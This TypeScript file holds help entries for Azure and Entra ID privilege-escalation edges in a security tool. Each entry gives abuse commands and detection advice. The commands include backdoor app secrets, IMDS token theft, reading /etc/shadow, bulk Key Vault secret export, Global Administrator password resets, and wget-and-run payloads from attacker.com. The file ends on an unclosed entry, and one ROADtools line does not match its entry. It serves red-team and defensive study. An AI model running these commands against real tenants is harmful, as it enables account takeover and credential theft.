import type { EdgeHelpText } from './types';

export const azureManipulationEdges: EdgeHelpText[] = [
  {
    kind: 'AZAddMembers',
    category: 'Azure Manipulation',
    general:
      'The AZAddMembers edge indicates that a principal can add members to an Azure AD (Entra ID) group. This permission is typically granted through group ownership, the Groups Administrator directory role, or specific MS Graph API permissions (GroupMember.ReadWrite.All). Adding members to security groups can grant access to resources, roles, and applications that use group-based access control. If the target group is role-assignable and holds Azure AD directory roles, this is a direct privilege escalation path.',
    windowsAbuse: `# Using Azure AD PowerShell to add a member
Connect-AzureAD
Add-AzureADGroupMember -ObjectId <GroupObjectId> -RefObjectId <UserOrSPObjectId>

# Using Microsoft Graph PowerShell
Connect-MgGraph -Scopes "GroupMember.ReadWrite.All"
New-MgGroupMember -GroupId <GroupId> -DirectoryObjectId <MemberObjectId>`,
    linuxAbuse: `# Using az CLI
az ad group member add --group <GroupObjectId> --member-id <UserOrSPObjectId>

# Using ROADtools
roadrecon plugin policies

# Using GraphRunner
Invoke-AddGroupMember -GroupId <GroupId> -MemberId <MemberId> -Token $token

# Using curl with MS Graph API
curl -X POST "https://graph.microsoft.com/v1.0/groups/<GroupId>/members/\\$ref" \\
  -H "Authorization: Bearer $token" \\
  -H "Content-Type: application/json" \\
  -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<MemberId>"}'`,
    opsec:
      'Adding a group member generates an "Add member to group" event in Azure AD Audit Logs with the actor, target group, and added member details. Microsoft Sentinel can alert on additions to sensitive groups. Azure AD PIM can require approval for eligible group membership. Monitor for additions to privileged groups and role-assignable groups. The Azure AD Access Reviews feature can detect unauthorized group membership changes.',
    references: [
      {
        title: 'Microsoft - Manage Azure AD Group Members',
        url: 'https://learn.microsoft.com/en-us/entra/fundamentals/groups-view-azure-portal',
      },
      {
        title: 'GraphRunner - Azure AD Toolkit',
        url: 'https://github.com/dafthack/GraphRunner',
      },
    ],
  },
  {
    kind: 'AZAddOwner',
    category: 'Azure Manipulation',
    general:
      'The AZAddOwner edge indicates that a principal can add owners to Azure AD applications, service principals, or groups. Application and service principal ownership is extremely powerful — an owner can add credentials (secrets/certificates), modify permissions, change redirect URIs, and effectively control the identity. Group ownership allows adding/removing members. This permission is typically available to current owners, Application Administrators, Cloud Application Administrators, or via specific MS Graph API permissions.',
    windowsAbuse: `# Add owner to an application
Connect-AzureAD
Add-AzureADApplicationOwner -ObjectId <AppObjectId> -RefObjectId <NewOwnerObjectId>

# Add owner to a service principal
Add-AzureADServicePrincipalOwner -ObjectId <SPObjectId> -RefObjectId <NewOwnerObjectId>

# Add owner to a group
Add-AzureADGroupOwner -ObjectId <GroupObjectId> -RefObjectId <NewOwnerObjectId>`,
    linuxAbuse: `# Add owner to an application using az CLI
az ad app owner add --id <AppId> --owner-object-id <NewOwnerObjectId>

# Using MS Graph API
curl -X POST "https://graph.microsoft.com/v1.0/applications/<AppObjectId>/owners/\\$ref" \\
  -H "Authorization: Bearer $token" \\
  -H "Content-Type: application/json" \\
  -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<NewOwnerObjectId>"}'

# Using GraphRunner
Invoke-AddApplicationOwner -AppObjectId <AppObjectId> -OwnerObjectId <OwnerObjectId> -Token $token`,
    opsec:
      'Adding an owner generates an "Add owner to application/service principal/group" event in Azure AD Audit Logs. This is a significant action that should be monitored closely, especially for applications with high-privilege API permissions. Monitor for new owners being added to applications that hold Application.ReadWrite.All, Directory.ReadWrite.All, or other sensitive MS Graph permissions. Azure AD PIM does not cover application ownership — this must be monitored via audit logs.',
    references: [
      {
        title: 'Microsoft - Azure AD Application Ownership',
        url: 'https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/overview-assign-app-owners',
      },
      {
        title: 'SpecterOps - Azure Privilege Escalation',
        url: 'https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48',
      },
    ],
  },
  {
    kind: 'AZAddSecret',
    category: 'Azure Manipulation',
    general:
      'The AZAddSecret edge indicates that a principal can add client secrets or certificate credentials to an Azure AD application or service principal. Adding a secret to an application or service principal allows the attacker to authenticate as that identity and exercise all of its permissions. This is one of the most common Azure AD privilege escalation techniques because many applications have broad API permissions (e.g., Mail.Read, Directory.ReadWrite.All) that the attacker inherits.',
    windowsAbuse: `# Add a secret to an application
Connect-AzureAD
$secret = New-AzureADApplicationPasswordCredential -ObjectId <AppObjectId> -CustomKeyIdentifier "Backdoor" -EndDate (Get-Date).AddYears(2)
$secret.Value  # Save this — it's only shown once

# Then authenticate as the application
$body = @{
    grant_type    = "client_credentials"
    client_id     = "<AppId>"
    client_secret = $secret.Value
    scope         = "https://graph.microsoft.com/.default"
}
$token = Invoke-RestMethod -Uri "https://login.microsoftonline.com/<TenantId>/oauth2/v2.0/token" -Method POST -Body $body`,
    linuxAbuse: `# Add a secret to an application using az CLI
az ad app credential reset --id <AppId> --append --display-name "Backdoor" --years 2

# Using MS Graph API
curl -X POST "https://graph.microsoft.com/v1.0/applications/<AppObjectId>/addPassword" \\
  -H "Authorization: Bearer $token" \\
  -H "Content-Type: application/json" \\
  -d '{"passwordCredential": {"displayName": "Backdoor", "endDateTime": "2028-01-01T00:00:00Z"}}'

# Authenticate as the service principal
curl -X POST "https://login.microsoftonline.com/<TenantId>/oauth2/v2.0/token" \\
  -d "grant_type=client_credentials&client_id=<AppId>&client_secret=<Secret>&scope=https://graph.microsoft.com/.default"

# Using GraphRunner
Invoke-AddApplicationSecret -AppObjectId <AppObjectId> -Token $token`,
    opsec:
      'Adding a credential generates "Update application - Certificates and secrets management" or "Add service principal credentials" events in Azure AD Audit Logs. Microsoft Sentinel can alert on credential additions to applications, especially those with high-privilege API permissions. Monitor for new credentials on applications where the actor is not the expected CI/CD pipeline or PKI system. Azure AD Application Insights and Microsoft Defender for Cloud Apps can detect anomalous application behavior after credential compromise.',
    references: [
      {
        title: 'Microsoft - Application Credentials',
        url: 'https://learn.microsoft.com/en-us/entra/identity-platform/howto-create-service-principal-portal',
      },
      {
        title: 'SpecterOps - Azure Privilege Escalation via API Permissions',
        url: 'https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48',
      },
    ],
  },
  {
    kind: 'AZAvereContributor',
    category: 'Azure Manipulation',
    general:
      'The AZAvereContributor edge indicates that a principal has the Avere Contributor role on an Azure resource. The Avere Contributor role is notable because it grants the Microsoft.Compute/virtualMachines/* permission, which includes the ability to run commands on Virtual Machines via the Run Command feature. This makes it equivalent to having code execution capabilities on any VM within the role scope, similar to the Contributor or VM Contributor roles.',
    abuse:
      'Use the Run Command feature to execute arbitrary commands on VMs within the role scope. This grants SYSTEM-level access on Windows VMs or root access on Linux VMs. az vm run-command invoke --resource-group <RG> --name <VM> --command-id RunShellScript --scripts "id" (Linux) or --command-id RunPowerShellScript --scripts "whoami" (Windows). From there, extract managed identity tokens, credentials, or pivot further.',
    opsec:
      'VM Run Command execution is logged in the Azure Activity Log under "Run Command on Virtual Machine" with the actor and command details. The command execution on the VM generates local OS events (Event ID 4688 for process creation on Windows, syslog on Linux). Microsoft Defender for Cloud detects suspicious Run Command usage. Monitor for Run Command invocations by unexpected principals.',
    references: [
      {
        title: 'Microsoft - Avere Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#avere-contributor',
      },
      {
        title: 'Microsoft - VM Run Command',
        url: 'https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview',
      },
    ],
  },
  {
    kind: 'AZContributor',
    category: 'Azure Manipulation',
    general:
      'The AZContributor edge indicates that a principal has the Contributor built-in role on an Azure resource scope. The Contributor role grants full read/write access to Azure resources within the scope, excluding the ability to manage role assignments (RBAC) or manage Azure Blueprints assignments. However, Contributor can execute commands on VMs (Run Command), manage Key Vaults (depending on access policy), deploy resources, and modify network configurations. At the subscription level, this is a broad privilege that affects all resource groups and resources.',
    windowsAbuse: `# Execute commands on a VM via Run Command
$result = Invoke-AzVMRunCommand -ResourceGroupName <RG> -VMName <VM> -CommandId RunPowerShellScript -ScriptString "whoami; Get-Process"
$result.Value[0].Message

# Extract managed identity tokens from a VM
Invoke-AzVMRunCommand -ResourceGroupName <RG> -VMName <VM> -CommandId RunPowerShellScript -ScriptString "Invoke-WebRequest -Uri 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -Headers @{Metadata='true'} | ConvertFrom-Json | Select access_token"

# Deploy a malicious ARM template
New-AzResourceGroupDeployment -ResourceGroupName <RG> -TemplateFile malicious.json`,
    linuxAbuse: `# Execute commands on a VM
az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "id && cat /etc/shadow"

# Extract managed identity token from within a VM
az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'"

# List and access Key Vault secrets (if access policy permits)
az keyvault secret list --vault-name <VaultName>
az keyvault secret show --vault-name <VaultName> --name <SecretName>

# Deploy resources
az deployment group create -g <RG> --template-file malicious.json`,
    opsec:
      'All Azure resource modifications by the Contributor role are logged in the Azure Activity Log with the principal identity, operation name, and resource details. VM Run Command generates "Run Command on Virtual Machine" events. Resource deployments generate deployment events. Microsoft Defender for Cloud monitors for suspicious VM operations. Monitor for Contributor role assignments at high scopes (subscription, management group) and for unusual resource operations by the Contributor identity.',
    references: [
      {
        title: 'Microsoft - Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#contributor',
      },
      {
        title: 'The Hacker Recipes - Azure RBAC Abuse',
        url: 'https://www.thehacker.recipes/entra-id/movement/azure-rbac',
      },
    ],
  },
  {
    kind: 'AZExecuteCommand',
    category: 'Azure Manipulation',
    general:
      'The AZExecuteCommand edge indicates that a principal can execute commands on an Azure resource, typically a Virtual Machine, via the Run Command feature, custom script extensions, or similar mechanisms. This provides direct code execution on the underlying OS of the target resource, effectively granting full control of the machine. On Windows VMs, commands run as SYSTEM; on Linux VMs, as root. This enables credential harvesting, managed identity token theft, and pivoting to on-premises networks for hybrid-joined environments.',
    windowsAbuse: `# Using Azure PowerShell Run Command
Invoke-AzVMRunCommand -ResourceGroupName <RG> -VMName <VM> -CommandId RunPowerShellScript -ScriptString "whoami; hostname; ipconfig"

# Using Custom Script Extension for persistent access
Set-AzVMCustomScriptExtension -ResourceGroupName <RG> -VMName <VM> -Name "backdoor" -FileUri "https://attacker.com/payload.ps1" -Run "payload.ps1"`,
    linuxAbuse: `# Using az CLI Run Command
az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "id; hostname; ip addr"

# Using az CLI Run Command for credential theft
az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/'"

# Using Custom Script Extension
az vm extension set -g <RG> --vm-name <VM> -n customScript --publisher Microsoft.Azure.Extensions --settings '{"commandToExecute":"wget -O /tmp/payload.sh https://attacker.com/payload.sh && bash /tmp/payload.sh"}'`,
    opsec:
      'Run Command execution generates Activity Log events "Run Command on Virtual Machine" or "Create or Update Virtual Machine Extension." OS-level events include process creation (Windows Event ID 4688, Linux auditd). Custom Script Extensions leave artifacts in /var/lib/waagent/ (Linux) or C:\\Packages\\Plugins\\ (Windows). Microsoft Defender for Cloud and Microsoft Defender for Endpoint detect suspicious Run Command and extension usage. Monitor for unexpected extension deployments and Run Command invocations.',
    references: [
      {
        title: 'Microsoft - VM Run Command',
        url: 'https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview',
      },
      {
        title: 'Microsoft - Custom Script Extension',
        url: 'https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-linux',
      },
    ],
  },
  {
    kind: 'AZGetCertificates',
    category: 'Azure Manipulation',
    general:
      'The AZGetCertificates edge indicates that a principal has permission to read certificates (including private keys) from an Azure Key Vault. The Key Vault Certificates permissions (Get, List) on the data plane allow retrieving certificate values. Certificates stored in Key Vault may include TLS/SSL certificates, code signing certificates, or certificates used for authentication to other services. Access to the private key of a certificate can enable impersonation, MitM attacks, or authentication as the certificate identity.',
    abuse:
      'Retrieve certificates from Key Vault using az keyvault certificate download --vault-name <vault> --name <cert> -f cert.pem for the public part, or az keyvault secret show --vault-name <vault> --name <cert> to get the full certificate with private key (certificates are stored as secrets). On Windows, use Get-AzKeyVaultSecret or Get-AzKeyVaultCertificate. The private key can then be used for TLS impersonation or service authentication.',
    opsec:
      'Key Vault access is logged in Azure Key Vault diagnostic logs (AuditEvent category). The "CertificateGet" and "SecretGet" operations are logged with the caller identity and client IP. Azure Monitor alerts can be configured for sensitive certificate access. Microsoft Sentinel has analytics rules for anomalous Key Vault access. Enable Key Vault soft-delete and purge protection to prevent destructive actions.',
    references: [
      {
        title: 'Microsoft - Key Vault Certificates',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/certificates/about-certificates',
      },
      {
        title: 'Microsoft - Key Vault Logging',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/logging',
      },
    ],
  },
  {
    kind: 'AZGetKeys',
    category: 'Azure Manipulation',
    general:
      'The AZGetKeys edge indicates that a principal has permission to read cryptographic keys from an Azure Key Vault. Key Vault keys are used for encryption, signing, and wrapping operations. Access to keys can enable decryption of encrypted data (e.g., Azure Disk Encryption keys, storage account encryption keys), signing of arbitrary data, or unwrapping of other keys. Some keys are marked as non-exportable, meaning they can only be used for cryptographic operations within Key Vault, but the ability to perform operations with the key is still powerful.',
    abuse:
      'List and retrieve keys using az keyvault key list --vault-name <vault> and az keyvault key show --vault-name <vault> --name <key>. For exportable keys, download with az keyvault key download. For non-exportable keys, use the Key Vault API to perform cryptographic operations (encrypt, decrypt, sign, verify, wrap, unwrap) using the key. If the key protects Azure Disk Encryption, access enables decryption of VM disks.',
    opsec:
      'Key access is logged in Key Vault diagnostic logs. "KeyGet," "KeyList," and cryptographic operations (KeyEncrypt, KeyDecrypt, KeySign) are all logged with caller identity. Monitor for unusual key access patterns, especially from identities that do not normally interact with the Key Vault. Enable Microsoft Sentinel Key Vault analytics rules.',
    references: [
      {
        title: 'Microsoft - Key Vault Keys',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/keys/about-keys',
      },
      {
        title: 'Microsoft - Key Vault Security',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/security-features',
      },
    ],
  },
  {
    kind: 'AZGetSecrets',
    category: 'Azure Manipulation',
    general:
      'The AZGetSecrets edge indicates that a principal has permission to read secrets from an Azure Key Vault. Key Vault secrets can contain any arbitrary data — commonly API keys, connection strings, passwords, certificates (with private keys), storage account keys, and other credentials. Access to Key Vault secrets is one of the most impactful permissions because secrets often provide direct access to other services, databases, and applications.',
    windowsAbuse: `# List and retrieve secrets using Azure PowerShell
Connect-AzAccount
Get-AzKeyVaultSecret -VaultName <VaultName>
$secret = Get-AzKeyVaultSecret -VaultName <VaultName> -Name <SecretName> -AsPlainText

# Bulk export all secrets
Get-AzKeyVaultSecret -VaultName <VaultName> | ForEach-Object {
    $name = $_.Name
    $value = Get-AzKeyVaultSecret -VaultName <VaultName> -Name $name -AsPlainText
    Write-Output "$name = $value"
}`,
    linuxAbuse: `# List secrets
az keyvault secret list --vault-name <VaultName>

# Retrieve a specific secret
az keyvault secret show --vault-name <VaultName> --name <SecretName> --query value -o tsv

# Bulk export all secrets
for name in $(az keyvault secret list --vault-name <VaultName> --query "[].name" -o tsv); do
  echo "$name: $(az keyvault secret show --vault-name <VaultName> --name $name --query value -o tsv)"
done`,
    opsec:
      'Secret access is logged in Key Vault diagnostic logs under "SecretGet" and "SecretList" operations with full caller identity and IP. Enable Azure Monitor alerts for bulk secret reads (multiple SecretGet operations in a short time). Microsoft Defender for Key Vault detects suspicious access patterns, high-volume reads, and access from unusual locations. Enable soft-delete and purge protection to prevent secret destruction.',
    references: [
      {
        title: 'Microsoft - Key Vault Secrets',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/secrets/about-secrets',
      },
      {
        title: 'The Hacker Recipes - Azure Key Vault',
        url: 'https://www.thehacker.recipes/entra-id/movement/azure-key-vault',
      },
    ],
  },
  {
    kind: 'AZGlobalAdmin',
    category: 'Azure Manipulation',
    general:
      'The AZGlobalAdmin edge indicates that a principal holds the Global Administrator (Company Administrator) directory role in Azure AD (Entra ID). This is the most powerful role in the Azure AD tenant — Global Administrators can manage all aspects of Azure AD and Microsoft 365, access all administrative features, assign any role to any user, reset any user password, read any data, and elevate to Azure subscription management. A Global Administrator can also elevate their access to manage all Azure subscriptions and management groups in the tenant via the "Access management for Azure resources" toggle.',
    windowsAbuse: `# Elevate to manage all Azure subscriptions
# In Azure Portal: Azure AD > Properties > "Access management for Azure resources" = Yes
# Or via PowerShell:
Connect-AzAccount
$token = (Get-AzAccessToken -ResourceUrl "https://management.azure.com/").Token
Invoke-RestMethod -Uri "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01" -Method POST -Headers @{Authorization="Bearer $token"}

# Reset any user's password
Set-AzureADUserPassword -ObjectId <UserObjectId> -Password (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)

# Assign any role
Add-AzureADDirectoryRoleMember -ObjectId <RoleObjectId> -RefObjectId <UserObjectId>`,
    linuxAbuse: `# Elevate to manage all Azure subscriptions
az rest --method POST --url "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"

# Reset any user password
az ad user update --id <UserObjectId> --password "NewPassword123!"

# Add credentials to any application
az ad app credential reset --id <AppId> --append

# Using GraphRunner for comprehensive GA abuse
Invoke-DumpApps -Token $token
Invoke-DumpUsers -Token $token`,
    opsec:
      'Global Administrator actions are heavily logged in Azure AD Audit Logs and Azure Activity Logs. The elevateAccess action generates a specific audit event. Password resets, role assignments, and application modifications are all logged. Microsoft Sentinel has built-in detection rules for suspicious Global Administrator activities. PIM can require just-in-time activation for the Global Administrator role with MFA and approval workflows. Monitor for permanent Global Administrator assignments and for the elevateAccess API call.',
    references: [
      {
        title: 'Microsoft - Global Administrator Role',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#global-administrator',
      },
      {
        title: 'Microsoft - Elevate Access',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin',
      },
    ],
  },
  {
    kind: 'AZGrant',
    category: 'Azure Manipulation',
    general:
      'The AZGrant edge indicates that a principal can grant Azure AD admin consent for API permissions to applications. Admin consent allows an application to access APIs on behalf of all users in the tenant without individual user consent. Granting consent for dangerous permissions (e.g., Mail.ReadWrite for all users, Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory) effectively gives the application broad access to tenant data and configuration.',
    abuse:
      'An attacker who can grant admin consent can approve dangerous API permissions for a controlled application. First create or take over an application, add the desired API permissions (e.g., Directory.ReadWrite.All), then grant admin consent. Use az ad app permission admin-consent --id <AppId> or the Azure Portal Enterprise Applications > Admin Consent flow. After consent, authenticate as the application to exercise the permissions.',
    opsec:
      'Admin consent grants generate "Consent to application" events in Azure AD Audit Logs with the consented permissions listed. Microsoft Sentinel and Microsoft Defender for Cloud Apps detect suspicious consent grants, especially for high-privilege MS Graph permissions. The "Admin consent workflow" feature can require approval for consent requests. Monitor for consent to Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory, Mail.ReadWrite, and other dangerous permissions.',
    references: [
      {
        title: 'Microsoft - Admin Consent',
        url: 'https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/grant-admin-consent',
      },
      {
        title: 'SpecterOps - Abusing Azure AD Application Permissions',
        url: 'https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48',
      },
    ],
  },
  {
    kind: 'AZGrantSelf',
    category: 'Azure Manipulation',
    general:
      'The AZGrantSelf edge indicates that a principal can grant API permissions to itself (self-consent). This typically applies to service principals or applications that have the AppRoleAssignment.ReadWrite.All MS Graph permission, which allows them to grant any MS Graph app role to any service principal — including themselves. This is a critical privilege escalation vector because a compromised application with this single permission can escalate to any MS Graph permission, including Directory.ReadWrite.All or RoleManagement.ReadWrite.Directory.',
    abuse:
      'If a service principal has AppRoleAssignment.ReadWrite.All, it can grant itself any other MS Graph app role. Use the MS Graph API: POST /servicePrincipals/<spId>/appRoleAssignments with the desired app role ID and the MS Graph service principal as the resource. After granting, the service principal can use the new permissions immediately. This is a common escalation path from initial app compromise to tenant-wide access.',
    opsec:
      'Self-consent generates "Add app role assignment to service principal" events in Azure AD Audit Logs. The rapid addition of multiple high-privilege app roles to a single service principal is a strong indicator of compromise. Microsoft Sentinel detects suspicious app role assignment patterns. Monitor for AppRoleAssignment.ReadWrite.All being granted to applications and for subsequent self-escalation.',
    references: [
      {
        title: 'Microsoft - MS Graph App Role Assignments',
        url: 'https://learn.microsoft.com/en-us/graph/api/serviceprincipal-post-approleassignments',
      },
      {
        title: 'SpecterOps - Azure AD Application Permissions Abuse',
        url: 'https://posts.specterops.io/azure-privilege-escalation-via-azure-api-permissions-abuse-74aee1006f48',
      },
    ],
  },
  {
    kind: 'AZKeyVaultContributor',
    category: 'Azure Manipulation',
    general:
      'The AZKeyVaultContributor edge indicates that a principal has the Key Vault Contributor role. This role grants management plane access to Key Vault resources, including the ability to modify Key Vault access policies. While Key Vault Contributor does not directly grant data plane access (reading secrets, keys, certificates), it can modify access policies to grant data plane permissions to any principal — including itself. This is a two-step escalation: first modify the access policy, then read the secrets.',
    windowsAbuse: `# Step 1: Modify Key Vault access policy to grant self access
Set-AzKeyVaultAccessPolicy -VaultName <VaultName> -ObjectId <SelfObjectId> -PermissionsToSecrets Get,List -PermissionsToKeys Get,List -PermissionsToCertificates Get,List

# Step 2: Read secrets
Get-AzKeyVaultSecret -VaultName <VaultName> | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName <VaultName> -Name $_.Name -AsPlainText
}`,
    linuxAbuse: `# Step 1: Modify access policy
az keyvault set-policy --name <VaultName> --object-id <SelfObjectId> --secret-permissions get list --key-permissions get list --certificate-permissions get list

# Step 2: Read secrets
az keyvault secret list --vault-name <VaultName>
az keyvault secret show --vault-name <VaultName> --name <SecretName> --query value -o tsv`,
    opsec:
      'Access policy modifications are logged in the Azure Activity Log under "Create or Update Key Vault" operations. The subsequent data plane access (SecretGet, KeyGet) is logged in Key Vault diagnostic logs. Monitor for access policy changes that add new principals with Get/List permissions, especially when the modifier and the new grantee are the same identity. Microsoft Defender for Key Vault detects policy modifications followed by data plane access.',
    references: [
      {
        title: 'Microsoft - Key Vault Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#key-vault-contributor',
      },
      {
        title: 'Microsoft - Key Vault Access Policies',
        url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/assign-access-policy',
      },
    ],
  },
  {
    kind: 'AZLogicAppContributor',
    category: 'Azure Manipulation',
    general:
      'The AZLogicAppContributor edge indicates that a principal has the Logic App Contributor role on a Logic App resource. Logic App Contributor can modify Logic App workflows, including changing the workflow definition to execute arbitrary HTTP requests, invoke Azure Management APIs, or call external services using the Logic App managed identity. If the Logic App has a managed identity with privileged permissions, modifying the workflow enables indirect access to those permissions.',
    abuse:
      'Modify the Logic App workflow to call the Azure Management API or MS Graph API using the Logic App managed identity. Add an HTTP action that requests a token from IMDS and uses it to call target APIs. The modified workflow runs with the Logic App managed identity permissions. Use az logic workflow update to modify the workflow definition, or edit directly in the Azure Portal Logic App Designer.',
    opsec:
      'Logic App modifications are logged in the Azure Activity Log under "Create or Update Logic App" operations. Logic App run history records all workflow executions with input/output details. Monitor for workflow modifications that add HTTP actions targeting Azure Management or MS Graph APIs. Microsoft Sentinel can correlate Logic App modifications with subsequent API calls made by the Logic App managed identity.',
    references: [
      {
        title: 'Microsoft - Logic App Contributor Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#logic-app-contributor',
      },
      {
        title: 'Microsoft - Logic Apps Managed Identity',
        url: 'https://learn.microsoft.com/en-us/azure/logic-apps/authenticate-with-managed-identity',
      },
    ],
  },
  {
    kind: 'AZOwner',
    category: 'Azure Manipulation',
    general:
      'The AZOwner edge indicates that a principal has the Owner built-in RBAC role on an Azure resource scope. The Owner role grants full access to manage resources AND the ability to assign roles to other principals (RBAC management). This is strictly more powerful than Contributor because Owner can delegate access. At the subscription level, Owner can grant any role to any principal on any resource, effectively controlling all access within the subscription. Owner also inherits all Contributor capabilities including VM command execution and resource deployment.',
    abuse:
      'Owner can perform all Contributor actions (VM Run Command, resource deployment, Key Vault access policy modification) plus assign roles. Grant yourself or a controlled identity additional roles: az role assignment create --role "User Access Administrator" --assignee <principalId> --scope /subscriptions/<id>. Assign Contributor to a controlled service principal for persistent access. The Owner role at management group scope controls all subscriptions within.',
    opsec:
      'All Owner actions are logged in the Azure Activity Log. Role assignment changes generate "Create role assignment" events. Monitor for Owner role assignments, especially at high scopes (subscription, management group). PIM can require just-in-time activation for Owner with MFA and approval. Azure Policy can restrict which roles can be assigned and by whom using deny policies.',
    references: [
      {
        title: 'Microsoft - Owner Role',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#owner',
      },
      {
        title: 'Microsoft - Azure RBAC Best Practices',
        url: 'https://learn.microsoft.com/en-us/azure/role-based-access-control/best-practices',
      },
    ],
  },
  {
    kind: 'AZOwns',
    category: 'Azure Manipulation',
    general:
      'The AZOwns edge indicates that a principal is an owner of an Azure AD object (application, service principal, or group). Object ownership in Azure AD grants significant control: application owners can add credentials, modify permissions, change redirect URIs, and manage certificates. Service principal owners can manage credentials and some configuration. Group owners can add and remove members. Unlike Azure RBAC Owner role, Azure AD ownership is specific to the object, not a scope.',
    abuse:
      'As an application owner, add a new client secret (az ad app credential reset --id <AppId> --append) to authenticate as the application. As a group owner, add controlled accounts to the group (az ad group member add). As a service principal owner, add credentials for authentication. The abuse is identical to AZAddSecret, AZAddMembers, etc., but ownership provides the permission automatically.',
    opsec:
      'Credential additions generate "Update application - Certificates and secrets management" audit events. Group member additions generate "Add member to group" events. Monitor for owners making changes to sensitive applications and groups. Regular ownership reviews should be conducted for all privileged applications and role-assignable groups.',
    references: [
      {
        title: 'Microsoft - Azure AD Application Ownership',
        url: 'https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/overview-assign-app-owners',
      },
      {
        title: 'BloodHound Documentation - AZOwns',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17323849204123-AZOwns',
      },
    ],
  },
  {
    kind: 'AZPrivilegedAuthAdmin',
    category: 'Azure Manipulation',
    general:
      'The AZPrivilegedAuthAdmin edge indicates that a principal holds the Privileged Authentication Administrator directory role. This role can reset credentials (including passwords) for any user in the tenant, including Global Administrators, Privileged Role Administrators, and other highly privileged users. This makes it one of the most powerful roles — an attacker with this role can take over any account by resetting its password. The only accounts exempt are those with authentication policies that prevent it.',
    abuse:
      'Reset the password of any user including Global Administrators. Use az ad user update --id <GA-ObjectId> --password "NewPassword123!" or the MS Graph API PATCH /users/<userId> with a new passwordProfile. After resetting a Global Administrator password, log in as that user to gain full tenant control. This role can also manage authentication methods (MFA, FIDO2 keys, phone numbers).',
    opsec:
      'Password resets generate "Reset user password" events in Azure AD Audit Logs with the actor and target user. Authentication method changes generate corresponding audit events. Microsoft Sentinel detects password resets of privileged accounts. PIM should require just-in-time activation for this role with MFA. Monitor for password resets of Global Administrators and other highly privileged accounts.',
    references: [
      {
        title: 'Microsoft - Privileged Authentication Administrator',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#privileged-authentication-administrator',
      },
    ],
  },
  {
    kind: 'AZPrivilegedRoleAdmin',
    category: 'Azure Manipulation',
    general:
      'The AZPrivilegedRoleAdmin edge indicates that a principal holds the Privileged Role Administrator directory role. This role manages Azure AD PIM (Privileged Identity Management) settings and can assign any Azure AD directory role to any user or group, including Global Administrator. This is effectively equivalent to Global Administrator because the role can promote any principal to Global Administrator. The Privileged Role Administrator also configures PIM policies (approval requirements, MFA, activation duration).',
    windowsAbuse: `# Assign Global Administrator to a controlled user
Connect-AzureAD
Add-AzureADDirectoryRoleMember -ObjectId <GARole-ObjectId> -RefObjectId <ControlledUser-ObjectId>

# Or modify PIM settings to remove approval requirements
# Then activate the GA role for a controlled eligible user

# Using Microsoft Graph PowerShell
Connect-MgGraph
New-MgRoleManagementDirectoryRoleAssignment -RoleDefinitionId <GARole-TemplateId> -PrincipalId <ControlledUser-ObjectId> -DirectoryScopeId "/"`,
    linuxAbuse: `# Assign Global Administrator role
az rest --method POST --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \\
  --headers "Content-Type=application/json" \\
  --body '{"@odata.type":"#microsoft.graph.unifiedRoleAssignment","roleDefinitionId":"<GA-RoleTemplateId>","principalId":"<ControlledUserId>","directoryScopeId":"/"}'

# Using GraphRunner
Invoke-AssignRole -RoleId <GARole-TemplateId> -PrincipalId <UserId> -Token $token`,
    opsec:
      'Role assignment changes generate "Add member to role" events in Azure AD Audit Logs. PIM policy modifications generate PIM-specific audit events. Microsoft Sentinel has built-in rules for detecting new Global Administrator assignments. Monitor for any role assignments made by Privileged Role Administrators, especially promoting principals to Global Administrator or other high-privilege roles. PIM can require approval for the Privileged Role Administrator role itself.',
    references: [
      {
        title: 'Microsoft - Privileged Role Administrator',
        url: 'https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference#privileged-role-administrator',
      },
      {
        title: 'Microsoft - Azure AD PIM',
        url: 'https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-configure',
      },
    ],
  },
  {
